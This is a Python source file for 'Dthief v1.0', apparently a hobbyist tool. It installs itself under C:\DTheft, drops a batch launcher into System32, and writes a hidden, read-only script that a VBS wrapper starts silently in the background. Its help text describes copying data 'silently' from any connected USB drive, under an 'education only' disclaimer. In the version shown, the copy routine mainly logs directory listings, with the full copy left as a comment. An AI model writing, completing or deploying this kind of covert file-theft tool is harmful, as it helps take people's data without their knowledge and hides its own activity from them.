import os, sys
from time import sleep
import shutil, socket

setup_path=r"C:\DTheft\setup_Dthief.pyw"

if not os.path.exists("C:\DTheft") :
    os.mkdir("C:\DTheft")
if os.path.exists("C:\DTheft\setup_Dthief.pyw") :
    pass 
elif not os.path.exists("C:\DTheft\setup_Dthief.pyw") :
    shutil.copy2(__file__, setup_path)
    # os.system("copy setup_Dthief.pyw C:\DTheft\setup_Dthief.pyw /Y /Z>nul")

if os.path.exists("C:\Windows\System32\dthief.bat") :
    pass 
elif not os.path.exists("C:\Windows\System32\dthief.bat") :
    run_bat = open (r"C:\Windows\System32\dthief.bat", "w")
    run_bat.write("""@echo off\ncolor 9\npython C:\DTheft\setup_Dthief.pyw\npause>nul""")
    run_bat.close()

runpath = r"C:\DTheft\run_dthief.vbs"


def intro():
    os.system("color 9")
    os.system("mode con: COLS=90 LINES=22")
    os.system("cls")
    animation = "#"
    print("\t"*5, animation *40, "\n","\t"*4, animation *40," "*5, "| \n", "\t"*3, animation * 10+ "     DTHIEF v1.0", "\t", animation *10, " "*11, "|\n", "\t"*2, animation *40," "*21, "| \n", "\t"*1, animation *40," "*9," |__By saad anouar__|", "\n")
    print("""\n List commands: \n\n            [--help or --info] to Read about program
            [--run or --start] to execute the program
            [--stop or --kill] to finish the program
            [--exit or --quit] exit and close windows
            [--link or --down] visite original source

    ____________________________________________________________________________
    |                                                                           |
    | >> In anytime : YOU CAN CLICK Ctrl+C on your keyboard to quite program    |
    | >> No need to write full command to open program only the first time,     |
    |                          after that just open CMD and type : "dthief"     |
    +___________________________________________________________________________+
            """)
intro()

def help_page():
    os.system("mode con: COLS=94 LINES=45")
    os.system("color f")

    print("""                             ___________________________
                            |                           |
                            |    Dthief v1.0 (help)     |
                            |___________________________|
                                     author : saad_anouar
    
===========================================================================================
=    NOTICE :                                                                             =
=             {Please Read carefully}                                                     =
=                                                                                         =
=    Need to use following command "python setup_dthief.pyw" to open program in first     =
=    time only, After you can just open command prompt and type "dthief".                 =
=                                                                                         =
=    Driver thief (Dthief): is a code writing by python3 language, and he use to copy     =
=    data silently from any usb connected on windows to "C:\DTheft_Data" folder, where    =
=    you find a folder named by date & time of copying data.                              = 
=                                                                                         =
=    The program run silently by enter (--run or --start) and stil working on background  =
=                                                                                         =
=    This program is purpose for education only, and any bad use the user remains respons =
=    -ible for it, and the developer has nothing to do with the way the program is used.  =
=                                                                                         =
=    Dthief program is free for personal use only, and the link to the original program   =
=    is on the famous website github on link bellow.                                      =
=                                                                                         =
=    In case for using from company, need to get writing authorization from developer for =
=    that.                                                                                =
=                                                                                         =
=    For personal use for developing others softwares, need to write the correct name of  =
=    developer on this code part before building or share your software or code.          = 
=                                                                                         =
=    List of Commands :                                                                   =
=                      Enter            : Dthief Home page                                =
=                      --run or --start : Lanch the program                               =
=                      --kill or --stop : stop program from running                       =
=                      --info or --help : you direct to this help page                    =
= +_____________________________________________________________________________________+ =
= |                                                                                     | =
= | [KEEP IN MIND] after lanching the program, he still running on background even you  | =
= | closed the terminal or exit program by typing (ctrl+C), and to stop him youneed to  | =
= | write the command "--kill or stop" then you can exit                                | =
= +_____________________________________________________________________________________+ =
===========================================================================================
""")



def sys_dthief():

    
    def Dthief_program():

        dthief = open(r"C:\DTheft\dthief.pyw", "w")
        dthief.write("""\n
import os, sys
from datetime import datetime
import os.path
from time import sleep  
import filecmp
from shutil import copy2


#path of file used
home_folder = r"c:\DTheft_Data"
tmp_file = r"C:\Temp\log.txt"
checker = r"C:\Temp\check.txt"
driver = r"C:\Temp\driver.txt"


# random folder
now = datetime.now()
dt_string = now.strftime("%m-%d-%y %H-%M-%S")""")
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.writelines("""\nmakefolder = home_folder+"\\"+dt_string+"\\""")
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.write("""\n
while True :

    # check directory 

    if not os.path.exists(home_folder) :
        os.mkdir(home_folder) 


    # earasing file 
    def reborn():
        ''' function for delete file if exist on machine'''

        if os.path.exists(driver) :
            os.remove(driver)
        if os.path.exists(tmp_file) :
            os.remove(tmp_file)
        if os.path.exists(checker) :
            os.remove(checker)
    reborn()

    # Creat rapport drivers
    def get_driver_info() :
        ''' creat a file 'information about your driver machine' to check if USB contected'''

        string_drive = "wmic logicaldisk get caption, drivetype >"
        full_path = string_drive+driver
        os.system(full_path)
    get_driver_info()


    # Read rapport drivers and check USB Drive
    def file_drive():
        ''' function read Driver info file and check if USB connected, if True creat a file with USB information'''

        file_drive = open(r"C:\Temp\driver.txt", "r")

        for i in file_drive :
            if "2" in i :

                
                indixing = i.find("2")
                degital = int(indixing)
                drive = i[:degital]
                lecteur = drive[1]
                # creat a log file content all information about USB          
                path_dir = "dir /W "+lecteur+": >"+tmp_file
                full_path_dir = str(path_dir)
                cmd = "cmd /C" +full_path_dir
                os.system(cmd)

            
    file_drive()


    # Creat Rapport comparision
    def path_directory(): 
        ''' function search in Dthief directory the log file and comapre content with log file of USB connected  to create a result comparition file'''

        if os.path.exists(tmp_file) :

            for dirpath, dirnames, filenames in os.walk(home_folder):
                for filenames in [f for f in filenames if f.endswith("log.txt")]:
                    log = os.path.join(dirpath, filenames)
                    

                    comp = filecmp.cmp(log, tmp_file)
                    string_comp = str(comp)
                    f = open(r"C:\Temp\check.txt", "a")""")
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.writelines('''
                    f.write(string_comp+"\\n")''')
        dthief.close()
        dthief = open(r"C:\DTheft\dthief.pyw", "a")
        dthief.write("""
                    f.close
                else :
                    f3 = open(r"C:\Temp\check.txt", "a")
                    f3.write("False")
                    f3.close
    path_directory()



    def rapport_drivers():

        if os.path.exists(checker) :
            
            with open(r"C:\Temp\check.txt") as f1 :
        
                line = [i.strip() for i in f1.readlines()]
                print(line)
                if "True" in line :
                    return
                elif "True" not in line:
                    os.mkdir(makefolder)
                    copy2(tmp_file, makefolder)

                    ### command line or defin copy all object inside usb and passt them here

        elif not os.path.exists(checker):
            pass   
    

    rapport_drivers()""")
        dthief.close()
        os.system("attrib +R +H C:\DTheft\dthief.pyw")
    Dthief_program()


    def command_dthief():
        bat_file = open(r"C:\DTheft\dthief_win.bat", "w")
        bat_file.write("python C:\DTheft\dthief.pyw")
        bat_file.close()
        os.system("attrib +R +H C:\DTheft\dthief_win.bat")
    command_dthief()


    def run_dthief():
        vbs_file = open(r"C:\DTheft\dthief_run.vbs", "w")
        vbs_file.write(r'''Set oShell = CreateObject ("Wscript.Shell") 
    Dim strArgs
    strArgs = "cmd /c C:\DTheft\dthief_win.bat"
    oShell.Run strArgs, 0, false
    ''')
        vbs_file.close()
        os.system(r"attrib +R +H C:\DTheft\dthief_run.vbs")
    run_dthief()
    

while True :
    intro()
    def user_answer():
        choose = input("C:\DTheft_Data>")

        if choose == "--run" or choose == "--RUN" or choose == "--start" or choose == "--START" :
            os.system("mode con: COLS=50 LINES=10")

            if os.path.exists(r"C:\DTheft\dthief_run.vbs") and os.path.exists(r"C:\DTheft\dthief_win.bat") and os.path.exists(r"C:\DTheft\dthief.pyw"):
                os.system("cls && color 4")
                print("\n"*3, " "*10," Dthief ACTIVTED SUCCESSFULY")
                sleep(1.0)
                os.system("start C:\DTheft\dthief_run.vbs")

            else :
                sys_dthief()
                os.system("start C:\DTheft\dthief_run.vbs")
                os.system("cls && color 4")
                print("\n"*6, " "*10," Dthief ACTIVTED SUCCESSFULY")
                sleep(2.0)

        elif choose == "--stop" or choose == "--kill" or choose == "--KILL" or choose == "--STOP":
            os.system("mode con: COLS=60 LINES=10")
            os.system("cls && color 9")
            print(" == >> Program stoped :( ")
            print("\n"*3, " "*5, "THANKS FOR USING MY PROGRAM 'Dthief v1' :) ", "\n", " "*19, "HOPE YOU LIKE IT", "\n", " "*19, "developed by : Saad Anouar", "\n"*2)
            
            sleep(2.5)
            os.system("taskkill /F /IM Python.exe >null")

        elif choose == "--help" or choose == "--HELP" or choose == "--info" or choose == "--INFO":
            os.system("cls")
            help_page()
            user_answer()
        elif choose == "--exit" or choose == "--EXIT" or choose == "--quit" or choose == "--QUIT" :
            os.system("cls && exit")
            sys.exit()
        elif choose == "--link" or choose == "--LINK" or choose == "--down" or choose == "--DOWN" :
            os.system("cls")
            IPaddress=socket. gethostbyname(socket. gethostname())
            if IPaddress!="127.0.0.1":
                os.system("start https://github.com/anrsaad/DTheft")
            else:
                os.system("mode con: COLS=50 LINES=10")
                os.system("cls && color 9")
                print("\n"*4," "*4, "CHECK YOUR CONNECTION AND TRY AGAIN :(")
                sleep(2.0)
                pass
                



    user_answer()

        


